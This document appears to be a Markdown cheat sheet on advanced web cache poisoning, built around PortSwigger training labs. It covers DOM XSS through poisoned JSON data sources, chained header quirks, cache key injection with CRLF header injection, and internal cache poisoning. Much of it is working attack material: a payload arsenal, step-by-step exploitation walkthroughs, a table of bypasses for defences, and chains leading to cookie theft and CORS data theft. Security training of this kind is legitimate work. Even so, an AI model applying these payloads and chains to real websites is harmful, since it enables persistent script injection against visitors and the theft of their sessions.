# Web cache poisoning - DOM XSS, combined techniques, cache key injection, internal cache

Advanced cache poisoning attacks that go beyond simple header reflection: poison the data source of a DOM XSS gadget (so the cache serves a response that causes client-side JS to fetch attacker-controlled data), chain multiple cache quirks together, inject payloads directly into cache keys via response header injection, or exploit a secondary internal cache that operates independently of the CDN layer.

## Quick reference
```
# DOM XSS via poisoned data source
X-Forwarded-Host: EXPLOIT-SERVER
-> response: var data = {host: "EXPLOIT-SERVER", ...}
-> initGeoLocate(data.host) fetches /resources/json/geolocate.json from EXPLOIT-SERVER
# Host geolocate.json: {"country":"<img src=1 onerror=alert(document.cookie)>"}
# Poison cache -> victim visits -> DOM XSS fires via geolocate.json fetch

# Combining vulnerabilities (two quirks, one cache entry)
X-Forwarded-Host: EXPLOIT-SERVER          (unkeyed, reflected in translations JSON URL)
X-Original-URL: /resources/json/translations.json  (overrides path)
-> chain both headers to simultaneously poison the translation endpoint

# Cache key injection (Pragma: x-get-cache-key reveals key structure)
Pragma: x-get-cache-key
-> response: X-Cache-Key: /login?lang=en?utm_content=x
# utm_content appended to lang param (regex flaw) -> lang value reflected in localize.js src
# Inject newline in lang: lang=en%0d%0aContent-Length:%200%0d%0a -> header injection in cached response

# Internal cache poisoning (two-layer architecture)
X-Forwarded-Host: EXPLOIT-SERVER          (unkeyed by external CDN)
# External cache keyed by query string; internal cache keyed by X-Forwarded-Host value
# Bypass external cache with Param Miner dynamic buster
# Internal cache stores poisoned analytics.js import permanently
```

## Root cause
- **DOM XSS via data source**: App passes an unkeyed header value (e.g., `data.host` from `X-Forwarded-Host`) to a JS function that fetches external JSON. Poisoning `data.host` poisons the data URL, causing the browser to fetch attacker-controlled JSON that triggers DOM XSS.
- **Combined techniques**: Some attacks need two separate unkeyed inputs to work - e.g., one header to change the resource URL and another to override which path is cached.
- **Cache key injection**: A flawed regex excludes a param from the cache key but still appends it to another param's value. That value is then reflected in a JS import URL or response header, enabling injection of newlines (response header injection) or path-altering strings.
- **Internal cache**: Some architectures have a CDN layer (keyed on full URL) plus an internal app-level cache (keyed on a subset of headers). Poisoning the internal cache persists even when the CDN evicts its entry.

## Find it
1. **DOM gadget**: Look for JS that calls functions like `initGeoLocate(host)`, `initTranslations(lang)` where `host`/`lang` originates from a server-supplied JS variable. Check if that variable comes from an unkeyed header.
2. **Combined quirks**: If one header changes a JS URL and another overrides the path, test both together - the cache may handle them independently.
3. **Cache key structure**: Send `Pragma: x-get-cache-key` (Varnish) or `Pragma: akamai-x-cache-on` (Akamai) - some caches echo the computed key in a response header, revealing what's included and what's not.
4. **Internal cache**: If poisoning seems to re-appear after CDN eviction, or if different responses appear on repeated identical requests, a secondary cache is likely.

## Technique

**DOM XSS via poisoned geolocate data (Lab 10):**
1. Homepage JS: `initGeoLocate("https://"+data.host)` - `data.host` sourced from server-rendered JS variable.
2. Param Miner confirms `X-Forwarded-Host` unkeyed and reflected in `data.host`.
3. Host exploit server `/resources/json/geolocate.json`:
   ```json
   {"country": "<img src=1 onerror=alert(document.cookie)>"}
   ```
4. Add cache buster; send `GET /` with `X-Forwarded-Host: EXPLOIT-SERVER` -> `data.host = "EXPLOIT-SERVER"`.
5. Replay until `X-Cache: hit`. Remove cache buster -> re-poison.
6. Victim visits -> JS reads `data.host = EXPLOIT-SERVER` from cache -> fetches exploit server JSON -> DOM XSS.

**Combining vulnerabilities - translations DOM XSS (Lab 11):**
1. `X-Forwarded-Host` changes URL of translations.json fetch (DOM XSS in `initTranslations()`).
2. `X-Original-URL` overrides the requested path -> point to `/resources/json/translations.json`.
3. Combine: send both headers to poison that specific path with exploit server translation data.
4. Host exploit server translations.json: `{"en": {"header": "<img src=1 onerror=alert(document.cookie)>"}}`.
5. Poison cache for the translations endpoint -> all pages using translations get DOM XSS.

**Cache key injection (Lab 12):**
1. `GET /login?lang=en?utm_content=x` -> `utm_content` excluded by flawed regex (only strips `&utm_content`; `?utm_content` remains appended to `lang`).
2. `lang` value reflected in `<script src="/js/localize.js?lang=en?utm_content=x">`.
3. `Pragma: x-get-cache-key` reveals `/login?lang=en` as the cache key (clean).
4. Inject newline into `lang`: `lang=en%0d%0aContent-Length:%200%0d%0a%0d%0a` -> HTTP response header injection in cached response.
5. `Origin` header + `cors=1` param triggers `Access-Control-Allow-Origin` reflection -> CORS header injection.
6. Full chain: craft `lang` value to smuggle a second cached response body with CSRF/XSS payload.

**Internal cache poisoning (Lab 13):**
1. External cache keyed by full URL (query string included). Internal app cache keyed by `X-Forwarded-Host`.
2. Param Miner dynamic cache buster bypasses external cache layer.
3. Send `X-Forwarded-Host: EXPLOIT-SERVER` with buster -> internal cache stores exploit server URL for `analytics.js`.
4. Remove buster -> internal cache serves poisoned analytics URL to all users regardless of CDN state.
5. When CDN cache misses (TTL expired), back-end hits internal cache -> returns poisoned response -> CDN re-caches it -> cycle continues.

## Payload arsenal
```
# DOM XSS via geolocate data
X-Forwarded-Host: EXPLOIT-SERVER
# Exploit server /resources/json/geolocate.json:
{"country":"<img src=1 onerror=alert(document.cookie)>"}

# DOM XSS via translations
X-Forwarded-Host: EXPLOIT-SERVER
X-Original-URL: /resources/json/translations.json
# Exploit server /resources/json/translations.json:
{"en":{"header":"<img src=1 onerror=alert(document.cookie)>"}}

# Cache key reveal
Pragma: x-get-cache-key

# Cache key injection (lang param)
/login?lang=en?utm_content=x               -> appended to lang in cache key
lang=en%0d%0aContent-Length:%200%0d%0a     -> header injection in cached response

# Internal cache bypass (Param Miner dynamic buster)
?cb=<dynamic>                               -> bypasses external CDN cache
X-Forwarded-Host: EXPLOIT-SERVER           -> poisons internal cache
```

## Bypasses
| Defense | Bypass |
|---|---|
| CDN evicts cache entry quickly | Internal cache may persist longer; re-poison or exploit internal cache |
| X-Forwarded-Host validated | Try X-Host, X-Forwarded-Server, X-HTTP-Host-Override |
| Strict cacheability (no-store on sensitive pages) | Find a cacheable resource (JS/JSON endpoint) that uses the same unkeyed input |
| utm_content removed from key by exact match | Test `?lang=x?utm_content=y` (appended to previous param via flawed regex) |

## Exploitation walkthrough
**DOM XSS (Lab 10):**
`X-Forwarded-Host: EXPLOIT-SERVER` -> poisons `data.host` in homepage response -> browser's `initGeoLocate()` fetches from exploit server -> exploit server geolocate.json returns DOM XSS payload -> `alert(document.cookie)` fires.

**Combining (Lab 11):**
Two headers: `X-Forwarded-Host` changes JSON base URL; `X-Original-URL` sets path. Together they poison the translations.json cache entry. All pages importing translations get DOM XSS payload from exploit server JSON.

**Key injection (Lab 12):**
`?lang=en?utm_content=x` -> `x` appended to lang in import URL. `Pragma: x-get-cache-key` reveals structure. Newline in lang -> header injection -> cached response with attacker-controlled headers. Full chain enables CSRF token bypass or CORS bypass for cookie exfiltration.

**Internal cache (Lab 13):**
Bypass CDN with dynamic buster -> poison internal cache with `X-Forwarded-Host: EXPLOIT-SERVER` -> remove buster -> internal cache serves poisoned analytics import -> XSS persists across CDN TTL cycles.

## Chaining
- DOM XSS -> cookie theft -> [Authentication](../../Authentication/)
- Cache key injection -> CORS bypass -> cross-origin data theft (combines with [CORS](../../CORS/))
- Header injection via cache key -> [HTTP-request-smuggling](../../HTTP-request-smuggling/) patterns
- Internal cache persistence -> long-lived stored XSS (days/weeks) without re-poisoning

## Tools
- **Param Miner** (BApp) - dynamic cache buster to bypass external CDN
- **Burp Repeater** - chain multiple headers, observe X-Cache headers
- **Exploit server** - host malicious JS/JSON with CORS headers as needed
- **Pragma: x-get-cache-key** - reveal cache key structure on Varnish-based caches

## Labs

### Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria [Expert]
`X-Forwarded-Host` reflected in `data.host` JS variable. `initGeoLocate()` fetches JSON from `data.host`. Exploit server hosts `geolocate.json` with DOM XSS payload. Cache is "strict" - requires careful timing and cache buster management. Key insight: the vulnerability isn't in the cache response itself but in what the cached response causes the browser's JS to do (DOM XSS via poisoned data source).

### Combining web cache poisoning vulnerabilities [Expert]
`X-Forwarded-Host` + `X-Original-URL` used simultaneously. `initTranslations()` vulnerable to DOM XSS via attacker-controlled JSON. Requires poisoning a specific path, not just the homepage. Key insight: real-world cache poisoning often requires stacking multiple quirks because a single one may not be sufficient to reach a useful XSS sink.

### Cache key injection [Expert]
Flawed `utm_content` exclusion regex appends it to `lang` value. Reveals cache key via `Pragma: x-get-cache-key`. `Origin` + `cors=1` enable header injection into the cached response. Full chain: append `lang=...%0d%0a...` to inject response headers into victim's cached response. Key insight: cache keys can themselves be injectable if they reflect URL parameters with insufficient normalization.

### Internal cache poisoning [Expert]
Two-layer caching: CDN (keyed by URL) + internal (keyed by X-Forwarded-Host). Param Miner dynamic buster bypasses CDN. Poisoning internal cache with `X-Forwarded-Host: EXPLOIT-SERVER` persists across CDN TTL because CDN re-fetches from back-end (which hits internal cache). Key insight: multi-tier caching means evicting one layer doesn't fix the poisoning - the internal layer re-seeds the CDN.

## Real-world notes
- DOM-based cache poisoning is harder to detect via scanning (no direct XSS in response) - look for JS that builds URLs/paths from server-supplied data.
- "Strict cacheability criteria" (no-cache, no-store flags) can often be worked around by targeting cacheable sub-resources (JS, JSON) that use the same unkeyed inputs.
- `Pragma: x-get-cache-key` is a Varnish debug feature. Akamai has similar (`Pragma: akamai-x-get-cache-key`). These are often left enabled on staging caches exposed to internet.
- Internal caches (memcached, Redis, local Nginx proxy_cache) are almost never accessible to external scanners - their poisoning is detected only by observing persistent behavioral anomalies.

## References
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
